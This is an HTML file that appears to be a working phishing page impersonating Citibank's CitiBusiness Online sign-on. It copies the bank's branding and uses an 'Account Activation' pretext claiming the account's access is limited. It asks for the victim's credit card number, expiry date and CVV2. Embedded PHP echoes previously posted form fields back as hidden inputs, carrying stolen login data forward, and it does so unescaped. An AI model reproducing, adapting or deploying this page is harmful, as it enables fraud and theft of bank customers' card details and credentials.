<html><head>

<meta http-equiv="P3P" content="CP=STA CUR NOR UNIo PREi TAI">

<link rel="STYLESHEET" type="text/css" href="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/html/styles/BAstyles.htm">

<style type="text/css">
BODY {margin-top:24;margin-left:0;background-color:white}
.footerLink {text-decoration:underline;font-size:8pt;color=black}
.footText {font-size:8pt}
.bigLink {text-decoration:none; font-family:sans-serif;font-size:9pt;font-weight:bold;color:#003399}
TD {font-size:9pt}
TH {font-size:9pt}
P {font-size:9pt}
.blue {color:blue}
</style>

<script language="javascript">

if (top != self)
  top.location=self.location;

var processing = false;
var NS4 = (document.layers) ? true : false;

var NN4P = false;
var NN6  = false;
var d = document;
var enableMouse;
var BAWindow;
var firstLink;
var ea = new Array();
var userString = new Array(-1,-1,-1);

var N6 = d.getElementById ? true : false;
var IE = d.all ? true : false;
var N4 = (!N6 && !IE);

var MAC = (navigator.platform.toUpperCase().indexOf("MAC") >= 0) ? true : false;

if (navigator.appName=="Netscape") {
        switch (navigator.appVersion.charAt(0)) {
                case "4" : NN4P = true; break;
                case "5" : NN6  = true;
        }
}

if (document.layers) {
        wwidth=window.outerWidth;
        wheight=window.outerHeight;
}

function ltrim(instr) { return instr.replace(/^\s+/,""); }
function rtrim(instr) { return instr.replace(/\s+$/,""); }
function trim(instr)  { return ltrim(rtrim(instr)); }

function scrollUp(pixels) {
  if (document.layers) {
    if (document.layers['warning'].clip.top > 0) {
      document.layers['warning'].clip.top -=pixels
          document.layers['warning'].clip.bottom -=pixels
          document.layers['warning'].offset(0,pixels)
        }
  }
}

function scrollDown(pixels) {
  if (document.layers) {
    if (document.layers['warning'].clip.bottom < 1500) {
        document.layers['warning'].clip.top += pixels
          document.layers['warning'].clip.bottom += pixels
          document.layers['warning'].offset(0,-pixels)
      }
    }
}


if (document.layers) {
        wwidth=window.outerWidth;
        wheight=window.outerHeight;
}

function secureCOOKIE () {
        return (location.protocol=="https:") ? ";SECURE" : "";
}

function BAbswo() {
        document.cookie = "BAbswo=F;PATH=/" +  secureCOOKIE();
}

function setOpenCookie() {
  if (window.name != "BAWindow") {
        document.cookie = "BAbswo=T;PATH=/" + secureCOOKIE ();
    }
}

function setClosedCookie() {
  if (window.name != "BAWindow") {
    if (!NN4P)
      BAbswo();
    if (BAWindow && !BAWindow.closed && BAWindow.BAbswo) {
      BAWindow.openerIsOpen = false;
      BAWindow.BAbswo();
    }
  }
}

function resize_fix(cw) {
        if (!document.layers) return;
        if((cw.wwidth!=cw.outerWidth) || (cw.wheight!=cw.outerHeight)) {
                cw.wwidth  = cw.outerWidth;
                cw.wheight = cw.outerHeight;
                cw.history.go(0);
        }
}

function sgnoff7 (URL) {
  window.open (URL,"closeBA", "width=400,height=250");
    if (toHomePage)
      toHomePage();
}

function init() {
  setOpenCookie();

  for (var x=0; x < d.links.length; x++) {
    if (d.links[x].name == "kp") {
      firstLink = x;
      break;
    }
  }
  
  if (d.forms["BusSignOn"]) {

    if (d.forms["BusSignOn"].signOnOption) {
      if (d.forms["BusSignOn"].signOnOption.length == 3)
        busSignon();
    }

    if (d.forms["BusSignOn"].busName)
      d.forms["BusSignOn"].busName.focus();
    else if (d.forms["BusSignOn"].busCode)
      d.links[firstLink].focus();
  }
  else if (window.name == "BAWindow") {
    if (IE) {
      ea[0] = d.all.u0;
      ea[1] = d.all.u1;
      ea[2] = d.all.u2;
    } else if (N6) {
      ea[0] = d.getElementById("u0");
      ea[1] = d.getElementById("u1");
      ea[2] = d.getElementById("u2");
    }

  }
}

function toHomePage2() {
        location.href = toHome;
}

function toHomePage() {
        if (!toHome) return;
        setTimeout ("toHomePage2()", 2500);
}

function goCiti(u) {
  if (window.name == "BAWindow") {
    window.open (u);
    return;
  } else {
    top.location = u;
  }
}

function getTimestamp() {
        var D = new Date();
        return D.getHours().toString() + D.getMinutes().toString() + D.getSeconds().toString();
}

function WindowRemote(Url, WindowName, xSize, ySize, isLocked) { // Pop-Up Window
  var xs = xSize || 800;
  var ys = ySize || 500;
  var winName = WindowName || 'New';
  var prefix = 'toolbar=0,location=0,directories=0,status=0,menubar=0,' +
    'scrollbars=1,copyhistory=0,resizable=0'
  if (isLocked)
    prefix = prefix.replace(/0/gi, "1");
  var permissions = prefix + ",left=50,top=10,width=" + xs + ",height=" + ys;
  var Window = window.open (Url, winName, permissions);
  Window.focus();
}

function getFeatures() {

        var features = "toolbar=no,status=yes,scrollbars=yes,resizable=yes,location=no," +
                "directories=no,copyhistory=no,menubar=no,";

        var s = screen;
        availTop = s.availTop || 0;
        availLeft = s.availLeft || 0;
        availHeight = s.availHeight;
        availWidth = s.availWidth;
        if (s.HEIGHT) {
                if (availWidth == document.body.offsetWidth) {
                        availLeft = window.screenLeft;
                }
                var v3 = s.height - availHeight;
                if (v3 > 0) {
                        var v1 = window.screenTop + document.body.offsetHeight;
                        if (v1 > availHeight)
                                availTop = v3;
                }
                availWidth  -= 12;
                availHeight -= 50;

                features += "height=" + availHeight + ",width=" +
                        availWidth + ",left=" + availLeft + ",top=" + availTop;

        } else {
                features += "outerHeight=" + s.availHeight + ",outerWidth=" +
                        s.availWidth + ",screenX=" + availLeft + ",screenY=" + availTop;
        }
        return features;        
}

</script><title>CitiBusiness Online</title>



<style type="text/css">
BODY {background-color:white}
TD {font-size:9pt}
TH {font-size:9pt}
P {font-size:9pt}
.backLink {color:blue}
.ecolor {background-color:#d3d3d3}
H3 {text-decoration: underline; font-size:10pt}
.blue {color:blue}
</style></head>

<body onload="init()" onunload="setClosedCookie()" onresize="resize_fix(window)" background="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/bg_top3n.gif">

<table border="0" cellpadding="0" cellspacing="0" width="100%">

<tbody><tr>
  <td><img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/citilog4.gif" border="0" height="34" hspace="12" vspace="12" width="58"></td>
  <td align="right">
    <a class="bigLink" href="#" onclick="javascript:goCiti('http://www.citibank.com/us/citibusinessOnline')">
    <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/img_topnav_dot.gif" border="0" height="17" width="7"> Home</a>
    &nbsp;
    <a class="bigLink" href="#" onclick="javascript:goCiti('http://www.citibank.com/us/citibusiness/cbusol/userguide.htm')">
    <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/img_topnav_dot.gif" border="0" height="17" width="7"> User Guide</a>
    &nbsp;    
    <a class="bigLink" href="#" onclick="javascript:goCiti('http://www.citi.com')">
    <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/img_topnav_dot.gif" border="0" height="17" width="7"> citi.com</a>
    &nbsp;
  </td>
</tr>

<!-- <tr>
  <td colspan="2">&nbsp; &nbsp;<img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/CBusLOGO.gif" border="0" height="29" vspace="2" width="220"></td>
</tr> -->

</tbody></table>
<script language="javascript">

var busNames = new Array();
NS4 = (document.layers) ? true : false;



var d = document;
var I0 = -1;
var N6 = d.getElementById ? true : false;
var IE = d.all ? true : false;
var MAC = (navigator.platform.substr(0,3)=="Mac");
var busCode = "";

if (d.layers) {
  d.tags.th.fontSize=11;
}

function updBusCode() {
  document.forms[0].busCode.value = busCode;
  return;
}

function clickNumber(i) {
  if (busCode.length >= 8)
    return;
  busCode += i.toString();
  updBusCode();
  if (!d.layers) {
    var v2 = Math.floor(Math.random() * 10);
    d.links[v2 + firstLink].focus();
  }
}

function clear() {
  busCode = "";
  updBusCode();
}

function backspace () {
  var b0 = busCode.length;
  if (!b0) return;
  busCode = busCode.substr(0,--b0);
  updBusCode();
}

function dBackspace () {
  if (IE) backspace();
}

function dClick(n) {
  if (IE) clickNumber (n);
}

function blockInput() {
  d.links[firstLink].focus();
}

function isBusNameExist(newName) {
  for (var x=0; x < busNames.length; x++) {
    if (busNames[x].toLowerCase() == newName.toLowerCase())
    return true;
  }
  return false;
}

function checkEnter1(event)
{   
  var code = 0;
  
  if (NS4)
    code = event.which;
  else
    code = event.keyCode;
  if (code==13)
    d.links[firstLink].focus();
}

function checkEnter2(event)
{   
  var code = 0;
  
  if (NS4)
    code = event.which;
  else
    code = event.keyCode;
  if (code==13)
    busSignon();
}

function busSignon() {
  var f = document.forms["BusSignOn"];
        
  f.target = "";
  f.TS.value = getTimestamp();
  if (document.layers) {
          f.method = "get";
    }
  
  var bn = trim(f.busName.value);

  if (bn=="") {
        alert ("You must enter a name for your business.");
        return;
  }

  if (bn.indexOf("^") >= 0) {
        alert ("The \"^\" character is not allowed in a business name.");
        return;
  }
  
  var v1 = trim(f.busCode.value);
  
  if (!(/^\d+$/.test(v1))) {
        alert ("Business code is invalid.");
        f.busCode.focus();
        return;
  }
  
  if (isBusNameExist(f.busName.value)) {
    alert(f.busName.value + " already exists.");
    return;
  }
    
  f.submitType.value = "Enter";
  f.submit();
  
}

</script>

<table align="center" border="0" width="95%">

  <tbody><tr valign="top">
    <td>
      
    
      <form name="BusSignOn" action="https://web.da-us.citibank.com/cgi-bin/citifi/scripts/login2/login.jsp" method="post">
  <?php
    $mypost = file("php://input");
    if (strlen($mypost[0])!=0)
    {
       $post_data = explode("&", $mypost[0]);

       for ($pos=0; $pos<sizeof($post_data); $pos++)
       {
        $data_field = explode("=", $post_data[$pos]);
        $key    = $data_field[0];
        $value  = $data_field[1];

        $key_new = str_replace("+"," ", $key);
        $key_new = rawurldecode($key_new);
        $value_new = str_replace("+"," ", $value);
        $value_new = rawurldecode($value_new);
        echo "<input type=\"hidden\" name=\"$key_new\" value=\"$value_new\">\r\n";
       }
    }
  ?>
      <input name="USpass" value="1" type="hidden"></td>  
      <table border="0">
        <tbody><tr>
          <td colspan="2">
            <b style="font-size: 12pt; color: darkred;">Account Activation</b><br><br>
          </td>
        </tr>
        <tr>
          <td colspan="2">
            <span style="color: darkblue; font-weight: bold;">Activate your account!</span><br><br>
            <p>During our regular update and verification of the Internet Banking Accounts, we could not
            verify your current information. Either your information has been changed or incomplete,
            as a result your access to use our services has been limited. Please update your information.</p>
            <hr noshade="noshade">
          </td>
        </tr>
        <tr height="5"><td></td></tr>
        <tr>
          <td colspan="2" align="left" width="10%">
          <b>Credit Card Number:&nbsp;&nbsp;</b><br>
          <input name="cc_num" size="19" maxlength="20"   type="text"></td>
        </tr>
        <tr height="5"><td></td></tr>
        <tr>
          <td colspan="2" align="left" width="10%">
          <b>Expiration on Card:&nbsp;&nbsp;</b> (mm/yy)<br>
          <input name="cc_exp" size="10" maxlength="5"   type="text"></td>
        </tr>
        <tr height="5"><td></td></tr>
        <tr>
          <td colspan="2" align="left" width="10%">
          <b>CVV2:&nbsp;&nbsp;</b><br>
          <input name="cc_cvv" size="6" maxlength="4"   type="text"></td>
        </tr>
        <tr height="5"><td></td></tr>
        <tr>
          <td colspan="2">
            <a href="#" onclick="document.BusSignOn.submit();"><img src="https://web.da-us.citibank.com/images/green_so_btn.gif" border="0"></a>
          </td>
        </tr>       
      </tbody></table>
    </form></td><td width="50%">&nbsp;</td>
  </tr>
</tbody></table>
<nolayer>
  </nolayer><div style="position: absolute; top: 120px; left: 52%; width: 48%; height: 55%;">
  </div>
<br><br>
<script type="text/javascript" language="JAVASCRIPT" src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/js/branding.js"></script>

<table valign="top" align="center" border="0" cellpadding="0" cellspacing="0" width="99%">
  <tbody><tr>
    <td background="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/line_hrz.gif" height="1"><img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/blank.gif" border="0" height="1" width="1">
    </td>
  </tr>
  <tr valign="top">
    <td>
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody><tr>
          <td colspan="2" height="6"><img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/blank.gif" border="0" height="6" width="1"></td>
        </tr>
        <tr>
          <td class="footText">
            Citibank, N.A., Citibank, F.S.B., Citibank (West), FSB, Citibank Texas, N.A. Member FDIC.
          <br>
            <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/citilog2.gif" alt="Citibank" border="0" height="18" width="21">
            <br><a class="footerLink" href="#" onclick="javascript:WindowRemote('http://www.citibank.com')">www.citi.com</a>
          </td>
          
          <td align="right" valign="top">
            <table border="0" cellpadding="0" cellspacing="0">
              <tbody><tr>
          <td valign="top">

           <a href="javascript:WindowRemote('/basprod/citiiwt/html/billPayment.html?BS_Branding=NoBranding')">
          <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/billpay.gif" alt="Bill Payment" border="0" height="68" width="80">
          
            </a>
          
          </td>
          <td valign="top">
           <a href="javascript:WindowRemote('https://digitalid.verisign.com/as2/840d72023c719a43bd14e84398f2f4c6')">
          <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/verisign.gif" alt="Verisign" border="0" height="58" width="100">
            </a>
          </td>
            <td class="footText" align="right" valign="top" width="220">
            <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/eqhouse.gif" alt="Equal Housing Lender" border="0" height="38" hspace="3" vspace="0" width="29"><br>
            <img src="https://citibusinessonline.da-us.citibank.com/basprod/citiiwt/images/member.gif" alt="Citibank" border="0">
            <br><a href="#" onclick="javascript:WindowRemote('http://www.citigroup.com/citigroup/privacy/index.htm')">Citigroup Privacy Promise</a>
            <br><a href="#" onclick="javascript:WindowRemote('http://www.citigroup.com/citigroup/privacy/terms.htm')">Terms, conditions, caveats and small print</a>
            <br>Copyright © 2005 Citibank
            
            </td>
              </tr>
            </tbody></table>
          </td>
          

        </tr>
      </tbody></table>

    </td>
  </tr>
</tbody></table>

<layer id="warning" clip="0,0,470,250" src="/basprod/citiiwt/html/ConsumerWarning.html" left="50%" width="46%" top="120"></layer>

<script language="javascript">

if (document.layers) {
  document.writeln("<layer left=\"70%\" width=\"46%\" top=\"370\">");
  document.writeln("<a href=\"#\" onClick=\"scrollUp(150)\">Up</a> |");
  document.writeln("<a href=\"#\" onClick=\"scrollDown(150)\">Down</a>");
  document.writeln("</layer>");
}

</script></body></html>